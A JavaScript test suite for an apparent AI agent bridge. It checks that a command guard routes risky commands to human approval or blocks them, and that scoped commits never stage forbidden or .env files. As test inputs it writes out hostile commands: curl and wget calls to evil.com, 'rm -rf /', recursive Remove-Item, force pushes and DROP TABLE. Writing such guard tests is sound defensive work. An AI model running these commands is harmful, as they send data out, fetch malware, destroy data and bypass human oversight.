/**
 * TESTS: Security Cases & Policy Enforcement
 * Phase: AI-DEV-BRIDGE-A.1
 *
 * Verifies all Section 17 security requirements:
 *  - unknown command => NOT AUTO (FAIL_CLOSED)
 *  - rm -rf => blocked/human
 *  - Remove-Item -Recurse => blocked/human
 *  - curl/wget => not auto
 *  - git push origin main => HUMAN_REQUIRED
 *  - git push --force => HUMAN_REQUIRED
 *  - gh pr merge => HUMAN_REQUIRED
 *  - vercel --prod => HUMAN_REQUIRED
 *  - production Supabase mutation => HUMAN_OWNER_REQUIRED
 *  - verification command cannot bypass guard
 *  - out-of-scope edit => SCOPE_VIOLATION
 *  - untracked file appears in audit
 *  - new allowed file is staged correctly
 *  - new forbidden file is never staged
 *  - R2 sandbox requirement is enforced
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { spawnSync } from "node:child_process";
import { classifyCommand, isAutomatic, requiresHuman } from "../../automation/agent-bridge/src/risk-classifier.js";
import { checkCommandSync } from "../../automation/agent-bridge/src/command-guard.js";
import { evaluateGate } from "../../automation/agent-bridge/src/approval-gate.js";
import {
  runVerificationCommands,
  collectChangedFiles,
  collectDiffStat,
} from "../../automation/agent-bridge/src/result-auditor.js";
import {
  verifyPathScope,
  safeScopedCommit,
} from "../../automation/agent-bridge/src/task-runner.js";

describe("Required Security Cases & Guard Enforcement (AI-DEV-BRIDGE-A.1)", () => {
  it("unknown command => NOT AUTO (fails closed to R3)", () => {
    const c = classifyCommand("malicious_unrecognized_binary --attack");
    assert.equal(isAutomatic(c.risk), false, "Unknown command must never be automatic");
    assert.ok(requiresHuman(c.risk), "Unknown command must require human approval");
    assert.equal(checkCommandSync("malicious_unrecognized_binary"), "HUMAN_REQUIRED");
  });

  it("rm -rf => blocked/human (R3)", () => {
    const c = classifyCommand("rm -rf packages/");
    assert.equal(c.risk, "R3");
    assert.equal(checkCommandSync("rm -rf packages/"), "HUMAN_REQUIRED");
  });

  it("Remove-Item -Recurse => blocked/human (R3)", () => {
    const c = classifyCommand("Remove-Item -Path apps/ -Recurse -Force");
    assert.equal(c.risk, "R3");
    assert.equal(checkCommandSync("Remove-Item -Path apps/ -Recurse -Force"), "HUMAN_REQUIRED");
  });

  it("curl/wget external mutation => not auto by default (R3)", () => {
    const c1 = classifyCommand("curl -X POST https://evil.com/hook");
    const c2 = classifyCommand("wget https://evil.com/malware");
    assert.equal(c1.risk, "R3");
    assert.equal(c2.risk, "R3");
    assert.equal(checkCommandSync("curl -X POST https://evil.com"), "HUMAN_REQUIRED");
    assert.equal(checkCommandSync("wget https://evil.com"), "HUMAN_REQUIRED");
  });

  it("git push origin main => HUMAN_REQUIRED", () => {
    assert.equal(checkCommandSync("git push origin main"), "HUMAN_REQUIRED");
  });

  it("git push --force => HUMAN_REQUIRED", () => {
    assert.equal(checkCommandSync("git push --force origin feat"), "HUMAN_REQUIRED");
    assert.equal(checkCommandSync("git push -f origin feat"), "HUMAN_REQUIRED");
  });

  it("gh pr merge => HUMAN_REQUIRED", () => {
    assert.equal(checkCommandSync("gh pr merge 12"), "HUMAN_REQUIRED");
  });

  it("vercel --prod => HUMAN_REQUIRED", () => {
    assert.equal(checkCommandSync("vercel --prod"), "HUMAN_REQUIRED");
  });

  it("production Supabase mutation => HUMAN_OWNER_REQUIRED / R4", () => {
    const drop = classifyCommand("DROP TABLE public.ai_tasks");
    const trunc = classifyCommand("TRUNCATE TABLE ai_tasks");
    assert.equal(drop.risk, "R4");
    assert.equal(trunc.risk, "R4");
  });

  it("verification command cannot bypass guard", () => {
    // Attempting to run a blocked command inside verification must be intercepted
    const results = runVerificationCommands({
      commands: [
        "npm run test",                 // allowed
        "rm -rf /",                     // BLOCKED by guard
        "git push --force origin main", // BLOCKED by guard
        "arbitrary-unknown-command",    // BLOCKED by fail-closed guard
      ],
      cwd: process.cwd(),
    });

    assert.equal(results.length, 4);
    assert.ok(results[0].command === "npm run test");

    // Guard-blocked items must fail with exitCode -1 and GUARD_BLOCKED message
    assert.equal(results[1].passed, false);
    assert.equal(results[1].exitCode, -1);
    assert.ok(results[1].stderr?.includes("GUARD_BLOCKED"));

    assert.equal(results[2].passed, false);
    assert.equal(results[2].exitCode, -1);
    assert.ok(results[2].stderr?.includes("GUARD_BLOCKED"));

    assert.equal(results[3].passed, false);
    assert.equal(results[3].exitCode, -1);
    assert.ok(results[3].stderr?.includes("GUARD_BLOCKED"));
  });

  it("R2 sandbox requirement is enforced in policy", async () => {
    const gateR2 = await evaluateGate("R2");
    assert.equal(gateR2.proceed, true);
    assert.equal(gateR2.sandboxRequired, true, "R2 policy must strictly require sandbox");

    const gateR1 = await evaluateGate("R1");
    assert.equal(gateR1.sandboxRequired, false);
  });

  it("Scope & Staging integration: out-of-scope edits detected, new allowed files staged, forbidden files never staged", () => {
    // Create an isolated git fixture repo in a temporary directory
    const tempDir = mkdtempSync(join(tmpdir(), "bridge-security-test-"));

    try {
      // Initialize temporary repo
      spawnSync("git", ["init"], { cwd: tempDir, encoding: "utf-8" });
      spawnSync("git", ["config", "user.name", "Test Runner"], { cwd: tempDir });
      spawnSync("git", ["config", "user.email", "test@example.com"], { cwd: tempDir });

      mkdirSync(join(tempDir, "allowed-src"), { recursive: true });
      mkdirSync(join(tempDir, "forbidden-dir"), { recursive: true });

      // Initial commit
      writeFileSync(join(tempDir, "allowed-src", "initial.txt"), "hello", "utf-8");
      spawnSync("git", ["add", "."], { cwd: tempDir });
      spawnSync("git", ["commit", "-m", "initial"], { cwd: tempDir });

      // Create new files:
      // 1. New allowed file (should be staged)
      writeFileSync(join(tempDir, "allowed-src", "new-file.ts"), "export const x = 1;", "utf-8");

      // 2. Out-of-scope file
      writeFileSync(join(tempDir, "other-dir.ts"), "export const y = 2;", "utf-8");

      // 3. Forbidden file
      writeFileSync(join(tempDir, "forbidden-dir", "secret.json"), "{}", "utf-8");

      // 4. Sensitive file (.env)
      writeFileSync(join(tempDir, ".env.local"), "SECRET=123", "utf-8");

      // Test 1: Untracked files appear in collectChangedFiles & collectDiffStat
      const changed = collectChangedFiles(tempDir);
      assert.ok(changed.length >= 4, `Expected at least 4 changed files, got: ${changed.join(", ")}`);
      assert.ok(changed.some((f) => f.includes("new-file.ts")));
      assert.ok(changed.some((f) => f.includes("other-dir.ts")));

      const diffStat = collectDiffStat(tempDir);
      assert.ok(diffStat.includes("Untracked files"), "Diff stat must report untracked files");
      assert.ok(diffStat.includes("new-file.ts"));

      // Test 2: Out-of-scope detection
      const scopeCheck = verifyPathScope({
        worktreePath: tempDir,
        allowedPaths: ["allowed-src/"],
        forbiddenPaths: ["forbidden-dir/"],
      });
      assert.equal(scopeCheck.inScope, false, "Scope check must fail when out-of-scope files exist");
      assert.ok(scopeCheck.violations.some((v) => v.includes("forbidden-dir")));
      assert.ok(scopeCheck.violations.some((v) => v.includes("other-dir.ts")));
      assert.ok(scopeCheck.violations.some((v) => v.includes(".env")));

      // Test 3: Safe scoped staging only stages allowed file, never stages forbidden or .env
      const stageResult = safeScopedCommit({
        worktreePath: tempDir,
        taskId: "test-sec-001",
        title: "Test safe scoped commit",
        allowedPaths: ["allowed-src/"],
        forbiddenPaths: ["forbidden-dir/"],
      });

      // Assert only new-file.ts was staged
      assert.ok(stageResult.stagedFiles.some((f) => f.includes("new-file.ts")), "new allowed file must be staged");
      assert.ok(!stageResult.stagedFiles.some((f) => f.includes("forbidden-dir")), "forbidden file must never be staged");
      assert.ok(!stageResult.stagedFiles.some((f) => f.includes(".env")), ".env must never be staged");
      assert.ok(!stageResult.stagedFiles.some((f) => f.includes("other-dir")), "out of scope file must never be staged");

      // Check git status in fixture repo after commit
      const postStatus = spawnSync("git", ["status", "--porcelain"], { cwd: tempDir, encoding: "utf-8" });
      // new-file.ts is committed, other-dir.ts and forbidden-dir are still untracked
      assert.ok(!postStatus.stdout.includes("new-file.ts"), "new-file.ts should now be committed");
      assert.ok(postStatus.stdout.includes("other-dir.ts"), "other-dir.ts should remain uncommitted");
      assert.ok(postStatus.stdout.includes("forbidden-dir"), "forbidden-dir should remain uncommitted");
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });
});
